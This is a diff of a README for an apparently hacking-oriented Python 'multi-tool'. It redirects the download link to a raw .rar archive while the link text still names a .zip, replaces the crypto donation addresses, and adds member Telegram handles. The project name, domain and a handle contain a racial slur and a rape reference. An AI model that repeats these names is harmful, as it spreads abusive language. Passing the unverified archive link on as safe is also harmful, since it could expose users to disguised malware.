@@ -9,7 +9,7 @@
 <p>
   
   - Developed in <strong>Python</strong>, by <a href="https://Elliotniggerson.shop/crashout">Crashout</a><br>
-  - Tool in <strong>English</strong>.<br>
+  - ElliotNarson members: <a href="https://t.me/kittencore">Crashout</a>, <a href="https://t.me/kayelhf">KL</a>, <a href="https://t.me/nonrapeable">SQ2</a>,
   - Available on <strong>Windows</strong> and <strong>Linux</strong>.<br>
   - <strong>No malware</strong> or <strong>backdoor</strong>.<br>
   - <strong>Open Source</strong> only for verification, ensuring no malicious programs.<br>
@@ -154,7 +154,7 @@
 
 <h1 align="center">Installation</h1>
 
-<a href="https://github.com/crashoutt/elliotmulti-tool">Dowloads "Elliotniggerson-Tools.zip" Here</a>
+<a href="https://github.com/crashoutt/elliotmulti-tool/raw/other/Elliot-Main.rar">Dowloads "Elliotniggerson-Tools.zip" Here</a>
 
 <p>
   
@@ -191,11 +191,11 @@ Or
   
   <strong>Bitcoin Adress:</strong>
   ``` 
-1MSRzopmhasr9ByHBrksScqv6wByVagDKe
+bc1qysukl28r800skaspsym70y5tn8tl2x49tfgs32
   ```
   <strong>Litecoin Adress:</strong>
   ```
-LXXnPk5hbUxNomJixbysoikZSv6QAiQyVQ
+LbnsCyuY7MXpSvXhUN5kyoC86f8VMHPSiD
   ```
 
 </p>
